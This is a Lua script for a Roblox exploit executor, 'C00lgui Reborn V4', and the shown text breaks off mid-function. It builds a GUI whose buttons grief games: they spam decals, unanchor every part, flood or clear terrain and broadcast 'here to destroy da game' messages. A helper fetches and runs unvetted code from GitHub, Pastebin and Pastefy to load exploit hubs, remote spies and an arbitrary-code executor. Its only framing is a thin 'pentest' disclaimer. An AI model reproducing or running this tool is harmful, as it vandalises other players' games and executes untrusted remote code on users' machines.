--[[
@@@@@@@  @@@@@@   @@@@@@  @@@       @@@@@@@  @@@  @@@ @@@    @@@@@@@  @@@@@@@@ @@@  @@@  @@@@@@  @@@@@@@@@@  @@@@@@@  @@@@@@@@ @@@@@@@  
!@@      @@!  @@@ @@!  @@@ @@!      !@@       @@!  @@@ @@!    @@!  @@@ @@!      @@!  @@@ @@!  @@@ @@! @@! @@! @@!  @@@ @@!      @@!  @@@ 
!@!      @!@  !@! @!@  !@! @!!      !@! @!@!@ @!@  !@! !!@    @!@!!@!  @!!!:!   @!@  !@! @!@!@!@! @!! !!@ @!@ @!@@!@!  @!!!:!   @!@  !@! 
:!!      !!:  !!! !!:  !!! !!:      :!!   !!: !!:  !!! !!:    !!: :!!  !!:       !: .:!  !!:  !!! !!:     !!: !!:      !!:      !!:  !!! 
 :: :: :  : : ::   : : ::  : ::.: :  :: :: :   :.:: :  :       :   : : : :: ::     ::     :   : :  :      :    :       : :: ::  :: :  :  
                                                                                                                                         
]]--
--U can use this to pentest ur game or wtv butu take responsability
--I need to clarify something
--I used AI to port this to the new c00lgui UI.
-- ============================================================
-- C00lgui Reborn V4 (Revamped) — TEMPLATE + PORTED c00lkidd SCRIPTS
-- Created by VOIDERTHEDESTROYER
-- Inspired by LordMuhammad's FE c00lgui
-- Credits to v3rx for some scripts including billboard
-- ============================================================

-- SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- MAIN GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "C00lguiReborn"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = PlayerGui

-- Credit notification (safe-wrapped)
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Credits to VOIDERTHEDESTROYER",
        Text = "C00lGUI Reborn V4(Revamped)",
    })
end)

print("=== C00lgui Reborn V4(Revamped) ===")
print("Created by VOIDERTHEDESTROYER")
print("Inspired by LordMuhammad's FE c00lgui")
print("Credits to v3rx for some scripts including billboard")

-- Title Bar
local TitleFrame = Instance.new("Frame")
TitleFrame.Name = "TitleBar"
TitleFrame.BorderSizePixel = 3
TitleFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleFrame.Size = UDim2.new(0, 461, 0, 50)
TitleFrame.Position = UDim2.new(0.5, -230, 0.15, 0)
TitleFrame.BorderColor3 = Color3.fromRGB(110, 0, 3)
TitleFrame.Active = true
TitleFrame.Parent = ScreenGui

local TitleGradient = Instance.new("UIGradient")
TitleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
}
TitleGradient.Parent = TitleFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.TextWrapped = true
TitleLabel.BorderSizePixel = 3
TitleLabel.TextSize = 14
TitleLabel.TextScaled = true
TitleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BorderColor3 = Color3.fromRGB(110, 0, 3)
TitleLabel.Text = "C00lgui Reborn"
TitleLabel.Parent = TitleFrame

local TitleLabelGradient = Instance.new("UIGradient")
TitleLabelGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
}
TitleLabelGradient.Parent = TitleLabel

-- Page Frame
local PageFrame = Instance.new("Frame")
PageFrame.Name = "page"
PageFrame.BorderSizePixel = 3
PageFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageFrame.Size = UDim2.new(0, 461, 0, 287)
PageFrame.Position = UDim2.new(0.5, -230, 0.15, 55)
PageFrame.BorderColor3 = Color3.fromRGB(110, 0, 3)
PageFrame.ClipsDescendants = true
PageFrame.Parent = ScreenGui

local PageGradient = Instance.new("UIGradient")
PageGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
}
PageGradient.Parent = PageFrame

-- Section Label
local SectionLabel = Instance.new("TextLabel")
SectionLabel.Name = "SectionLabel"
SectionLabel.TextWrapped = true
SectionLabel.BorderSizePixel = 3
SectionLabel.TextSize = 14
SectionLabel.TextScaled = true
SectionLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SectionLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
SectionLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
SectionLabel.Size = UDim2.new(1, 0, 0, 41)
SectionLabel.Position = UDim2.new(0, 0, 0, 0)
SectionLabel.BorderColor3 = Color3.fromRGB(110, 0, 3)
SectionLabel.Text = "Section name"
SectionLabel.ZIndex = 2
SectionLabel.Parent = PageFrame

local SectionGradient = Instance.new("UIGradient")
SectionGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
}
SectionGradient.Parent = SectionLabel

-- Button Container
local ButtonContainer = Instance.new("ScrollingFrame")
ButtonContainer.Name = "ButtonContainer"
ButtonContainer.BackgroundTransparency = 1
ButtonContainer.BorderSizePixel = 0
ButtonContainer.Position = UDim2.new(0, 0, 0, 41)
ButtonContainer.Size = UDim2.new(1, 0, 1, -82)
ButtonContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
ButtonContainer.ScrollBarThickness = 6
ButtonContainer.ScrollBarImageColor3 = Color3.fromRGB(150, 0, 0)
ButtonContainer.ZIndex = 1
ButtonContainer.Parent = PageFrame

local ButtonLayout = Instance.new("UIListLayout")
ButtonLayout.SortOrder = Enum.SortOrder.LayoutOrder
ButtonLayout.Padding = UDim.new(0, 4)
ButtonLayout.Parent = ButtonContainer

local ButtonPadding = Instance.new("UIPadding")
ButtonPadding.PaddingTop = UDim.new(0, 4)
ButtonPadding.PaddingBottom = UDim.new(0, 4)
ButtonPadding.PaddingLeft = UDim.new(0, 4)
ButtonPadding.PaddingRight = UDim.new(0, 4)
ButtonPadding.Parent = ButtonContainer

-- Bottom Row
local PageNameLabel = Instance.new("TextLabel")
PageNameLabel.Name = "PageName"
PageNameLabel.TextWrapped = true
PageNameLabel.BorderSizePixel = 3
PageNameLabel.TextSize = 14
PageNameLabel.TextScaled = true
PageNameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PageNameLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
PageNameLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
PageNameLabel.BorderColor3 = Color3.fromRGB(110, 0, 3)
PageNameLabel.Text = "Page"
PageNameLabel.Position = UDim2.new(0, 0, 1, -41)
PageNameLabel.Size = UDim2.new(1, 0, 0, 41)
PageNameLabel.ZIndex = 2
PageNameLabel.Parent = PageFrame

local PageNameGradient = Instance.new("UIGradient")
PageNameGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
}
PageNameGradient.Parent = PageNameLabel

local PrevButton = Instance.new("TextButton")
PrevButton.Name = "PrevButton"
PrevButton.TextWrapped = true
PrevButton.BorderSizePixel = 0
PrevButton.TextSize = 14
PrevButton.TextScaled = true
PrevButton.TextColor3 = Color3.fromRGB(0, 0, 0)
PrevButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PrevButton.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
PrevButton.Size = UDim2.new(0.5, 0, 0, 41)
PrevButton.Position = UDim2.new(0, 0, 1, -41)
PrevButton.Text = "<"
PrevButton.ZIndex = 3
PrevButton.Parent = PageFrame

local PrevGradient = Instance.new("UIGradient")
PrevGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
}
PrevGradient.Parent = PrevButton

local NextButton = Instance.new("TextButton")
NextButton.Name = "NextButton"
NextButton.TextWrapped = true
NextButton.BorderSizePixel = 0
NextButton.TextSize = 14
NextButton.TextScaled = true
NextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
NextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NextButton.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
NextButton.Size = UDim2.new(0.5, 0, 0, 41)
NextButton.Position = UDim2.new(0.5, 0, 1, -41)
NextButton.Text = ">"
NextButton.ZIndex = 3
NextButton.Parent = PageFrame

local NextGradient = Instance.new("UIGradient")
NextGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
}
NextGradient.Parent = NextButton

-- ============================================================
-- PAGE SYSTEM
-- ============================================================
local pages = {}
local currentPageIndex = 1

local function createButton(text, callback, order)
    local btn = Instance.new("TextButton")
    btn.TextWrapped = true
    btn.BorderSizePixel = 0
    btn.TextSize = 14
    btn.TextScaled = true
    btn.TextColor3 = Color3.fromRGB(0, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    btn.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
    btn.Size = UDim2.new(1, 0, 0, 50)
    btn.Text = text
    btn.LayoutOrder = order or 0

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0.000, Color3.fromRGB(171, 0, 0)),
        ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 5))
    }
    gradient.Parent = btn

    btn.MouseButton1Click:Connect(function()
        local success, err = pcall(callback)
        if not success then
            warn("[C00lgui] Button error:", err)
        end
    end)

    return btn
end

local function renderPage()
    for _, child in ipairs(ButtonContainer:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end

    local page = pages[currentPageIndex]
    if not page then return end

    PageNameLabel.Text = page.name
    SectionLabel.Text = page.section

    for i, btnData in ipairs(page.buttons) do
        local btn = createButton(btnData.name, btnData.callback, i)
        btn.Parent = ButtonContainer
    end

    ButtonContainer.CanvasSize = UDim2.new(0, 0, 0, ButtonLayout.AbsoluteContentSize.Y + 8)
end

local function addPage(name, section)
    local page = {
        name = name,
        section = section or name,
        buttons = {}
    }
    function page:addButton(buttonName, callback)
        table.insert(self.buttons, { name = buttonName, callback = callback })
        return self
    end
    table.insert(pages, page)
    return page
end

local function goToPage(index)
    if #pages == 0 then return end
    if index < 1 then index = #pages end
    if index > #pages then index = 1 end
    currentPageIndex = index
    renderPage()
end

PrevButton.MouseButton1Click:Connect(function() goToPage(currentPageIndex - 1) end)
NextButton.MouseButton1Click:Connect(function() goToPage(currentPageIndex + 1) end)

-- ============================================================
-- SAFE REMOTE LOADER
-- ============================================================
local function loadRemote(url)
    local ok, src = pcall(function() return game:HttpGet(url) end)
    if not ok or type(src) ~= "string" or #src < 5 then
        warn("[C00lgui] Failed to fetch: " .. tostring(url))
        return
    end
    local fn, err = loadstring(src)
    if not fn then
        warn("[C00lgui] Loadstring error (" .. url .. "): " .. tostring(err))
        return
    end
    local ok2, err2 = pcall(fn)
    if not ok2 then
        warn("[C00lgui] Runtime error (" .. url .. "): " .. tostring(err2))
    end
end

-- ============================================================
-- PAGE 1 — c00lkidd Scripts
-- ============================================================
local page1 = addPage("Page1", "c00lkidd Scripts")

page1:addButton("Skybox", function()
    local s = Instance.new("Sky")
    s.Name = "Sky"
    s.Parent = game.Lighting
    s.SkyboxBk = "http://www.roblox.com/asset/?id=158118263"
    s.SkyboxDn = "http://www.roblox.com/asset/?id=158118263"
    s.SkyboxFt = "http://www.roblox.com/asset/?id=158118263"
    s.SkyboxLf = "http://www.roblox.com/asset/?id=158118263"
    s.SkyboxRt = "http://www.roblox.com/asset/?id=158118263"
    s.SkyboxUp = "http://www.roblox.com/asset/?id=158118263"
    game.Lighting.TimeOfDay = 12
end)

page1:addButton("Message", function()
    local o = Instance.new("Message", workspace)
    task.spawn(function()
        while o.Parent do
            o.Text = "team c00lkidd is here to destroy da game [] join now"
            task.wait(10)
        end
    end)
end)

page1:addButton("Hint", function()
    local o = Instance.new("Hint", workspace)
    task.spawn(function()
        while o.Parent do
            o.Text = "team c00lkidd is here to destroy da game [] join now"
            task.wait(10)
        end
    end)
end)

page1:addButton("billboard", function()
    local plr = game.Players.LocalPlayer
    if not plr.Character then return end
    local head = plr.Character:FindFirstChild("Head")
    if not head then return end
    local existing = head:FindFirstChild("BillboardGui")
    if existing then existing:Destroy() end

    local y = Instance.new("BillboardGui")
    y.Size = UDim2.new(0, 100, 0, 150)
    y.StudsOffset = Vector3.new(0, 1, 0)
    y.Parent = head
    y.Adornee = head

    local f = Instance.new("TextLabel")
    f.Parent = y
    f.BackgroundTransparency = 1
    f.Position = UDim2.new(0, 0, 0, -50)
    f.Size = UDim2.new(0, 100, 0, 100)
    f.Font = "Arial"
    f.FontSize = "Size48"
    f.Text = "C00lkidd"
    f.TextStrokeColor3 = Color3.new(0, 0, 0)
    f.TextColor3 = Color3.new(1, 1, 1)
    f.TextStrokeTransparency = 0
    f.TextYAlignment = "Bottom"
end)

page1:addButton("Decal spam", function()
    local decalID = 158118263
    local function exPro(root)
        for _, v in ipairs(root:GetChildren()) do
            if v:IsA("Decal") and v.Texture ~= "rbxassetid://" .. decalID then
                v:Destroy()
            elseif v:IsA("BasePart") then
                v.Material = Enum.Material.Plastic
                v.Transparency = 0
                for _, face in ipairs({
                    Enum.NormalId.Front, Enum.NormalId.Back,
                    Enum.NormalId.Right, Enum.NormalId.Left,
                    Enum.NormalId.Top, Enum.NormalId.Bottom
                }) do
                    local decal = Instance.new("Decal")
                    decal.Texture = "rbxassetid://" .. decalID
                    decal.Face = face
                    decal.Parent = v
                end
            end
            exPro(v)
        end
    end
    exPro(workspace)
end)

page1:addButton("unanchor all", function()
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then v.Anchored = false end
    end
end)

page1:addButton("Lalol Hub", function()
    loadRemote("https://raw.githubusercontent.com/Obunga-666/Lalol-hub-without-hint/refs/heads/main/Lalol%20hub%20without%20hint")
end)

page1:addButton("Grab Knife v4", function()
    loadRemote("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt")
end)

page1:addButton("Grab Knife V1", function()
    loadRemote("https://raw.githubusercontent.com/retpirato/Roblox-Scripts/refs/heads/master/Grab%20Knife%20V1.lua")
end)

page1:addButton("C00lify", function()
    local hint = Instance.new("Hint")
    hint.Text = "TEAM C00LKIDD REVIVAL JOIN TODAY!!!!!"
    hint.Parent = workspace

    for _, object in ipairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") then
            for _, face in ipairs({
                Enum.NormalId.Front, Enum.NormalId.Back,
                Enum.NormalId.Top, Enum.NormalId.Bottom,
                Enum.NormalId.Left, Enum.NormalId.Right
            }) do
                local decal = Instance.new("Decal")
                decal.Texture = "rbxassetid://14569362147"
                decal.Face = face
                decal.Parent = object
            end
        end
    end
end)

page1:addButton("Flood", function()
    game.Workspace.Terrain:SetCells(
        Region3int16.new(Vector3int16.new(-100, -100, -100), Vector3int16.new(100, 100, 100)),
        17, "Solid", "X"
    )
end)

page1:addButton("Clear Terrain", function()
    game.Workspace.Terrain:Clear()
end)

page1:addButton("Destroy GUI", function()
    local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("C00lguiReborn")
    if gui then gui:Destroy() end
end)

-- ============================================================
-- PAGE 2 — Admin / Tools
-- ============================================================
local page2 = addPage("Page2", "Admin / Tools")

page2:addButton("Infinite Yield", function()
    loadRemote("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
end)

page2:addButton("Harked V2 (remote events)", function()
    loadRemote("https://pastefy.app/bYH0yJP0/raw")
end)

page2:addButton("Cobalt", function()
    loadRemote("https://pastefy.app/ykELyWcC/raw")
end)

page2:addButton("Hydroxide", function()
    loadRemote("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/init.lua")
    loadRemote("https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/ui/main.lua")
end)

page2:addButton("Dex plus plus", function()
    loadRemote("https://github.com/AZYsGithub/DexPlusPlus/releases/latest/download/out.lua")
end)

page2:addButton("Dex:Recontinued", function()
    loadRemote("https://github.com/Tesker-103/DexRecontinued/releases/latest/download/out.lua")
end)

page2:addButton("SimpleSpy", function()
    loadRemote("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpyBeta.lua")
end)

page2:addButton("QuirkyCMD", function()
    loadRemote("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw")
end)

page2:addButton("Fates Admin", function()
    loadRemote("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua")
end)

page2:addButton("Loadstringer", function()
    local lg = Instance.new("ScreenGui")
    lg.Name = "LoadstringerUI"
    lg.ResetOnSpawn = false
    lg.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 460, 0, 310)
    MainFrame.Position = UDim2.new(0.5, -230, 0.5, -155)
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = lg

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 8)
    UICorner.Parent = MainFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    Title.Text = "Lua Loadstringer Utility"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 18
    Title.Font = Enum.Font.SourceSansBold
    Title.Parent = MainFrame

    local InputBox = Instance.new("TextBox")
    InputBox.Size = UDim2.new(0.9, 0, 0, 100)
    InputBox.Position = UDim2.new(0.05, 0, 0.13, 0)
    InputBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    InputBox.TextColor3 = Color3.fromRGB(200, 200, 200)
    InputBox.Text = ""
    InputBox.ClearTextOnFocus = false
    InputBox.TextXAlignment = Enum.TextXAlignment.Left
    InputBox.TextYAlignment = Enum.TextYAlignment.Top
    InputBox.MultiLine = true
    InputBox.Font = Enum.Font.Code
    InputBox.TextSize = 14
    InputBox.Parent = MainFrame

    local InputCorner = Instance.new("UICorner")
    InputCorner.CornerRadius = UDim.new(0, 4)
    InputCorner.Parent = InputBox

    local DropdownLabel = Instance.new("TextLabel")
    DropdownLabel.Size = UDim2.new(0.3, 0, 0, 30)
    DropdownLabel.Position = UDim2.new(0.05, 0, 0.48, 0)
    DropdownLabel.BackgroundTransparency = 1
    DropdownLabel.Text = "Output Style:"
    DropdownLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    DropdownLabel.TextSize = 14
    DropdownLabel.Font = Enum.Font.SourceSansBold
    DropdownLabel.TextXAlignment = Enum.TextXAlignment.Left
    DropdownLabel.Parent = MainFrame

    local SelectionButton = Instance.new("TextButton")
    SelectionButton.Size = UDim2.new(0.6, 0, 0, 30)
    SelectionButton.Position = UDim2.new(0.35, 0, 0.48, 0)
    SelectionButton.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
    SelectionButton.Text = "Standard Loadstring"
    SelectionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    SelectionButton.Font = Enum.Font.SourceSans
    SelectionButton.TextSize = 14
    SelectionButton.Parent = MainFrame

    local SelectCorner = Instance.new("UICorner")
    SelectCorner.CornerRadius = UDim.new(0, 4)
    SelectCorner.Parent = SelectionButton

    local DropdownList = Instance.new("Frame")
    DropdownList.Size = UDim2.new(0.6, 0, 0, 60)
    DropdownList.Position = UDim2.new(0.35, 0, 0.58, 0)
    DropdownList.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    DropdownList.BorderSizePixel = 1
    DropdownList.BorderColor3 = Color3.fromRGB(70, 70, 70)
    DropdownList.ZIndex = 5
    DropdownList.Visible = false
    DropdownList.Parent = MainFrame

    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Parent = DropdownList
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

    local styles = {
        {Name = "Standard Loadstring", Id = "Standard"},
        {Name = "game:HttpGet Fetch Stub", Id = "HttpGet"}
    }
    local selectedStyle = "Standard"

    for i, style in ipairs(styles) do
        local Opt = Instance.new("TextButton")
        Opt.Size = UDim2.new(1, 0, 0, 30)
        Opt.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        Opt.Text = style.Name
        Opt.TextColor3 = Color3.fromRGB(220, 220, 220)
        Opt.Font = Enum.Font.SourceSans
        Opt.TextSize = 14
        Opt.ZIndex = 6
        Opt.Parent = DropdownList

        Opt.MouseButton1Click:Connect(function()
            selectedStyle = style.Id
            SelectionButton.Text = style.Name
            DropdownList.Visible = false
        end)
    end

    SelectionButton.MouseButton1Click:Connect(function()
        DropdownList.Visible = not DropdownList.Visible
    end)

    local LoadstringButton = Instance.new("TextButton")
    LoadstringButton.Size = UDim2.new(0.65, -5, 0, 35)
    LoadstringButton.Position = UDim2.new(0.05, 0, 0.61, 0)
    LoadstringButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    LoadstringButton.Text = "Generate & Copy"
    LoadstringButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    LoadstringButton.Font = Enum.Font.SourceSansBold
    LoadstringButton.TextSize = 16
    LoadstringButton.Parent = MainFrame

    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 4)
    ButtonCorner.Parent = LoadstringButton

    local ClearButton = Instance.new("TextButton")
    ClearButton.Size = UDim2.new(0.25, -5, 0, 35)
    ClearButton.Position = UDim2.new(0.7, 5, 0.61, 0)
    ClearButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
    ClearButton.Text = "Clear"
    ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ClearButton.Font = Enum.Font.SourceSansBold
    ClearButton.TextSize = 16
    ClearButton.Parent = MainFrame

    local ClearCorner = Instance.new("UICorner")
    ClearCorner.CornerRadius = UDim.new(0, 4)
    ClearCorner.Parent = ClearButton

    local OutputBox = Instance.new("TextBox")
    OutputBox.Size = UDim2.new(0.9, 0, 0, 65)
    OutputBox.Position = UDim2.new(0.05, 0, 0.75, 0)
    OutputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    OutputBox.TextColor3 = Color3.fromRGB(0, 255, 120)
    OutputBox.Text = ""
    OutputBox.ClearTextOnFocus = false
    OutputBox.TextEditable = false
    OutputBox.Font = Enum.Font.Code
    OutputBox.TextSize = 12
    OutputBox.TextWrapped = true
    OutputBox.Parent = MainFrame

    local OutputCorner = Instance.new("UICorner")
    OutputCorner.CornerRadius = UDim.new(0, 4)
    OutputCorner.Parent = OutputBox

    ClearButton.MouseButton1Click:Connect(function()
        InputBox.Text = ""
        OutputBox.Text = ""
        selectedStyle = "Standard"
        SelectionButton.Text = "Standard Loadstring"
        DropdownList.Visible = false
    end)

    LoadstringButton.MouseButton1Click:Connect(function()
        local rawScript = InputBox.Text
        if rawScript == "" then
            OutputBox.Text = "-- Please input a valid script first!"
            return
        end

        local formattedScript = ""
        if selectedStyle == "Standard" then
            formattedScript = string.format("loadstring([====[%s]====])()", rawScript)
        elseif selectedStyle == "HttpGet" then
            formattedScript = string.format("loadstring(game:HttpGet(\"%s\"))()", rawScript)
        end

        OutputBox.Text = formattedScript

        pcall(function()
            if setclipboard then
                setclipboard(formattedScript)
            elseif toclipboard then
                toclipboard(formattedScript)
            end
        end)
    end)
end)

page2:addButton("Silent Executor", function()
    local sg = Instance.new("ScreenGui")
    sg.Name = "CodeExecutorLocal"
    sg.ResetOnSpawn = false
    sg.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local exe = Instance.new("Frame")
    exe.Position = UDim2.new(0.5, -291, 0.5, -157)
    exe.Size = UDim2.new(0, 600, 0, 300)
    exe.BackgroundColor3 = Color3.new(0, 1, 0)
    exe.BackgroundTransparency = 0.5
    exe.BorderSizePixel = 0
    exe.Active = true
    exe.Draggable = true
    exe.Parent = sg

    local run = Instance.new("TextButton", exe)
    run.Position = UDim2.new(0, 0, 1, -30)
    run.Size = UDim2.new(0, 140, 0, 30)
    run.BackgroundColor3 = Color3.new(1, 1, 1)
    run.Text = "Execute"
    run.Font = Enum.Font.ArialBold
    run.TextSize = 24
    run.TextColor3 = Color3.new(0, 1, 0)

    local clear = Instance.new("TextButton", exe)
    clear.Position = UDim2.new(0, 460, 1, -30)
    clear.Size = UDim2.new(0, 140, 0, 30)
    clear.BackgroundColor3 = Color3.new(1, 1, 1)
    clear.Text = "Clear"
    clear.Font = Enum.Font.ArialBold
    clear.TextSize = 24
    clear.TextColor3 = Color3.new(1, 0, 0)

    local hide = Instance.new("TextButton", exe)
    hide.Position = UDim2.new(0.5, -70, 1, -30)
    hide.Size = UDim2.new(0, 140, 0, 30)
    hide.BackgroundColor3 = Color3.new(1, 1, 1)
    hide.Text = "Hide"
    hide.Font = Enum.Font.ArialBold
    hide.TextSize = 24
    hide.TextColor3 = Color3.new(0, 0, 0)

    local code = Instance.new("TextBox", exe)
    code.Size = UDim2.new(1, 0, 0.9, 0)
    code.BackgroundColor3 = Color3.new(0, 0, 0)
    code.BorderSizePixel = 0
    code.Text = "print(\"Hello Local World!\")"
    code.TextSize = 14
    code.TextWrapped = true
    code.TextXAlignment = Enum.TextXAlignment.Left
    code.TextYAlignment = Enum.TextYAlignment.Top
    code.TextColor3 = Color3.new(0, 1, 0)
    code.ClearTextOnFocus = false

    local V3Logo = Instance.new("ImageLabel", exe)
    V3Logo.Position = UDim2.new(0.1, 0, 0.2, 0)
    V3Logo.Size = UDim2.new(0.8, 0, 0.3, 0)
    V3Logo.BackgroundTransparency = 1
    V3Logo.Image = "rbxassetid://127743025"
    V3Logo.ZIndex = 10
    V3Logo.BorderSizePixel = 0

    local show = Instance.new("TextButton", sg)
    show.Position = UDim2.new(-0.01, 0, 1, -30)
    show.Size = UDim2.new(0, 140, 0, 30)
    show.BackgroundColor3 = Color3.new(1, 1, 1)
    show.Text = "Show"
    show.Font = Enum.Font.ArialBold
    show.TextSize = 24
    show.TextColor3 = Color3.new(0, 1, 0)
    show.Visible = false

    local append = Instance.new("TextButton", exe)
    append.Position = UDim2.new(0.5, -70, 1, 0)
    append.Size = UDim2.new(0, 140, 0, 30)
    append.BackgroundColor3 = Color3.new(1, 1, 1)
    append.Text = "Append Code"
    append.Font = Enum.Font.ArialBold
    append.TextSize = 24
    append.TextColor3 = Color3.new(0, 0, 0)

    local nl = Instance.new("TextButton", exe)
    nl.Position = UDim2.new(0.5, -70, 1, 30)
    nl.Size = UDim2.new(0, 140, 0, 30)
    nl.BackgroundColor3 = Color3.new(1, 1, 1)
    nl.Text = "New Line"
    nl.Font = Enum.Font.ArialBold
    nl.TextSize = 24
    nl.TextColor3 = Color3.new(0, 0, 0)

    local savecode = Instance.new("StringValue")
    savecode.Parent = exe
    savecode.Name = "AppendedCode"
    savecode.Value = ""

    append.MouseButton1Down:Connect(function()
        savecode.Value = savecode.Value .. code.Text
        code.Text = ""
        append.Text = "Appended"
        task.wait(1)
        append.Text = "Append Code"
    end)

    nl.MouseButton1Down:Connect(function()
        code.Text = code.Text .. "\n"
    end)

    hide.MouseButton1Down:Connect(function()
        exe.Visible = false
        show.Visible = true
    end)

    show.MouseButton1Down:Connect(function()
        exe.Visible = true
        show.Visible = false
    end)

    clear.MouseButton1Down:Connect(function()
        code.Text = ""
        savecode.Value = ""
    end)

    run.MouseButton1Down:Connect(function()
        local src = savecode.Value .. code.Text
        local fn, err = loadstring(src)
        if not fn then
            warn("[Silent] Loadstring error: " .. tostring(err))
            return
        end
        local ok, output = pcall(fn)
        if not ok then warn("[Silent] Execution error: " .. tostring(output)) end
    end)
end)

-- ============================================================
-- PAGE 3 — More Tools
-- ============================================================
local page3 = addPage("Page3", "More Tools")

page3:addButton("RC7 Remake by Stygian", function()
    loadRemote("https://pastebin.com/raw/b787QKMQ")
end)

page3:addButton("Voiderz Hub", function()
    loadRemote("https://raw.githubusercontent.com/voiderthedestroyerz/Scripts-archive/refs/heads/main/voiderzfetrollinggui.lua")
end)

page3:addButton("Ultimate Vulnerable Hub", function()
    loadRemote("https://raw.githubusercontent.com/voiderthedestroyerz/Scripts-archive/refs/heads/main/ultimatevulnerablehub/ultimatevulnerablehub.lua")
end)

page3:addButton("Bricks Serverside", function()
    local existing = game.Players.LocalPlayer.PlayerGui:FindFirstChild("BricksServerside")
    if existing then existing:Destroy() end

    local sg = Instance.new("ScreenGui")
    sg.Name = "BricksServerside"
    sg.ResetOnSpawn = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
